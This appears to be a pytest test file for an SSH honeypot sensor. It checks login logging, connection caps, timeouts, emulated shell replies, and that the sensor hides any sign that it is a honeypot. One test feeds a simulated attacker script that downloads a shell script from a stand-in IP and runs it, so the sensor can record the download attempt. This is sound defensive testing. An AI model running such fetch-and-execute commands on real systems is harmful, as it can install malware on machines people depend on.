from __future__ import annotations

import asyncio
import json
from pathlib import Path

import asyncssh
import pytest

from ssh_sensor import hostkeys


async def _read_until(reader: asyncssh.SSHReader[str], marker: str, limit: float = 5) -> str:
    buf = ""
    async with asyncio.timeout(limit):
        while marker not in buf:
            chunk = await reader.read(4096)
            if not chunk:
                break
            buf += chunk
    return buf


async def test_login_failure_and_success_events(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        with pytest.raises(asyncssh.PermissionDenied):
            await h.connect(password="wrong", preferred_auth="password")
        conn = await h.connect(username="admin", password="admin", preferred_auth="password")
        conn.close()
        await conn.wait_closed()
        logins = await h.events("login_attempt")
        assert [(e.data["username"], e.data["password"], e.data["success"]) for e in logins][
            :2
        ] == [
            ("root", "wrong", False),
            ("admin", "admin", True),
        ]
        assert all(e.data["method"] == "password" for e in logins[:2])
        types = [e.type for e in await h.events()]
        assert types[0] == "connect" and "disconnect" in types
        assert {e.dst_port for e in await h.events()} == {22}
        assert len({e.session_id for e in await h.events()}) == 2


async def test_publickey_is_recorded_and_rejected(make_harness, tmp_path: Path) -> None:  # type: ignore[no-untyped-def]
    key = asyncssh.generate_private_key("ssh-ed25519")
    async with make_harness() as h:
        with pytest.raises(asyncssh.PermissionDenied):
            await h.connect(client_keys=[key], preferred_auth="publickey")
        ev = [e for e in await h.events("login_attempt") if e.data["method"] == "publickey"]
        assert ev and ev[0].data["success"] is False
        assert ev[0].data["key_type"] == "ssh-ed25519"
        assert ev[0].data["key_fingerprint"].startswith("SHA256:")


async def test_max_auth_attempts_disconnects(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(max_auth_attempts=3) as h:
        for _ in range(5):
            with pytest.raises(
                (asyncssh.PermissionDenied, asyncssh.ConnectionLost, asyncssh.DisconnectError)
            ):
                await h.connect(password="nope")
        fails = [e for e in await h.events("login_attempt") if not e.data["success"]]
        assert len(fails) >= 5
        disc = await h.events("disconnect")
        assert any(e.data["login_attempts"] >= 1 for e in disc)


async def test_interactive_session_bot_script(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        conn = await h.connect()
        proc = await conn.create_process(term_type="xterm", encoding="utf-8")
        banner = await _read_until(proc.stdout, "# ")
        assert "Welcome to Ubuntu 24.04" in banner
        script = [
            "uname -a",
            "cat /proc/cpuinfo | grep name | wc -l",
            "cd /tmp",
            "wget http://198.51.100.7/x.sh",
            "chmod +x x.sh",
            "./x.sh",
        ]
        transcript = ""
        for line in script:
            proc.stdin.write(line + "\r")
            transcript += await _read_until(proc.stdout, "# ")
        assert "Linux srv-web01" in transcript
        assert "\r\n2\r\n" in transcript
        assert "saved" in transcript
        proc.stdin.write("exit\r")
        await proc.wait_closed()
        conn.close()
        await conn.wait_closed()

        cmds = await h.events("command")
        assert [e.data["input"] for e in cmds] == [*script, "exit"]
        assert cmds[0].data["prompt"] == "root@srv-web01:~# "
        assert cmds[3].data["cwd"] == "/tmp"
        dl = await h.events("download_attempt")
        assert dl[0].data["url"] == "http://198.51.100.7/x.sh"
        assert dl[0].data["tool"] == "wget"
        disc = (await h.events("disconnect"))[0]
        frames = disc.data["replay"]
        assert frames and all(len(f) == 3 and f[1] in ("o", "i") for f in frames)
        assert any("wget" in f[2] for f in frames if f[1] == "i")
        assert len(json.dumps(frames)) <= 12 * 1024
        assert disc.data["commands"] == len(script) + 1  # + exit


async def test_exec_request(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        conn = await h.connect()
        res = await conn.run("uname -s; whoami; foo", check=False)
        assert res.stdout == "Linux\nroot\n"
        assert res.stderr == "bash: line 1: foo: command not found\n"
        conn.close()
        cmds = await h.events("command")
        assert cmds[0].data["input"] == "uname -s; whoami; foo"


async def test_piped_shell_no_pty(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        conn = await h.connect()
        res = await conn.run(input="echo hi\nid -u\n", check=False)
        assert res.stdout == "hi\n0\n"
        conn.close()


async def test_per_ip_cap(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(max_per_ip=2) as h:
        c1, c2 = await h.connect(), await h.connect()
        with pytest.raises((asyncssh.Error, OSError)):
            await h.connect()
        assert h.sensor.rejected >= 1
        c1.close()
        await c1.wait_closed()
        await asyncio.sleep(0.1)
        c3 = await h.connect()
        for c in (c2, c3):
            c.close()


async def test_global_cap(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(max_connections=1, max_per_ip=5) as h:
        c1 = await h.connect()
        with pytest.raises((asyncssh.Error, OSError)):
            await h.connect()
        c1.close()


async def test_line_length_cap(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(max_line=100) as h:
        conn = await h.connect()
        proc = await conn.create_process(term_type="xterm", encoding="utf-8")
        await _read_until(proc.stdout, "# ")
        proc.stdin.write("A" * 500)
        await asyncio.wait_for(proc.wait_closed(), 5)
        conn.close()
        disc = (await h.events("disconnect"))[0]
        assert disc.data["reason"] == "line too long"


async def test_idle_timeout(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(idle_timeout=0.5) as h:
        conn = await h.connect()
        proc = await conn.create_process(term_type="xterm", encoding="utf-8")
        await _read_until(proc.stdout, "# ")
        await asyncio.wait_for(proc.wait_closed(), 5)
        disc = (await h.events("disconnect"))[0]
        assert disc.data["reason"] == "idle timeout"
        conn.close()


async def test_login_timeout(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(login_timeout=0.5) as h:
        reader, writer = await asyncio.open_connection("127.0.0.1", h.port)
        line = await reader.readline()
        assert line.startswith(b"SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.14")
        data = await asyncio.wait_for(reader.read(100000), 5)  # kexinit then EOF
        assert isinstance(data, bytes)
        writer.close()
        await asyncio.sleep(0.2)
        # never authenticated: no connect/disconnect of its own, one per-IP summary instead
        assert await h.events("disconnect") == []
        assert h.sink.flush_summaries() == 1
        (summary,) = await h.events("scan")
        assert summary.data["kind"] == "connection_summary"
        assert summary.data["count"] == 1 and summary.data["rejected"] == 0


async def test_port_forwarding_refused_and_recorded(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        conn = await h.connect()
        with pytest.raises(asyncssh.ChannelOpenError):
            await conn.open_connection("198.51.100.99", 25)
        scans = await h.events("scan")
        assert scans[0].data["kind"] == "tcp_forward_attempt"
        conn.close()


async def test_publisher_failure_never_breaks_session(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        h.publisher.ok = False
        conn = await h.connect()
        res = await conn.run("echo ok")
        assert res.stdout == "ok\n"
        conn.close()
        await h.events()
        assert h.sink.publish_failed > 0


async def test_event_rate_limit(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(events_per_sec=1.0, events_burst=3.0) as h:
        h.sink._ip.rate = 0.001
        h.sink._ip.burst = 3.0
        for _ in range(10):
            conn = await h.connect()
            await conn.run("echo x")
            conn.close()
        await h.events()
        assert h.sink.rate_limited > 0


async def test_no_giveaways(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        reader, writer = await asyncio.open_connection("127.0.0.1", h.port)
        blob = await reader.readline()
        writer.close()
        conn = await h.connect()
        res = await conn.run(
            "env; cat /etc/hostname; uname -a; ps aux; cat /proc/version", check=False
        )
        blob += res.stdout.encode()
        for word in (b"honeypot", b"suckerpot", b"asyncssh"):
            assert word not in blob.lower()
        conn.close()


def test_hostkeys_persisted_with_0600(tmp_path: Path) -> None:
    keys1 = hostkeys.load_or_create_host_keys(tmp_path / "hk")
    files = sorted((tmp_path / "hk").iterdir())
    assert len(files) == 3
    assert all((f.stat().st_mode & 0o777) == 0o600 for f in files)
    keys2 = hostkeys.load_or_create_host_keys(tmp_path / "hk")
    assert [k.get_fingerprint() for k in keys1] == [k.get_fingerprint() for k in keys2]
    assert {k.algorithm for k in keys1} == {b"ssh-ed25519", b"ssh-rsa", b"ecdsa-sha2-nistp256"}


async def test_scp_upload_is_recorded_not_stored(make_harness, tmp_path: Path) -> None:  # type: ignore[no-untyped-def]
    f = tmp_path / "payload.bin"
    f.write_bytes(b"abc" * 100)
    async with make_harness() as h:
        conn = await h.connect()
        await asyncssh.scp(str(f), (conn, "/tmp/payload.bin"))
        conn.close()
        cmds = await h.events("command")
        up = cmds[0].data["scp_upload"][0]
        assert up["size"] == 300 and up["name"] == "payload.bin" and len(up["sha256"]) == 64
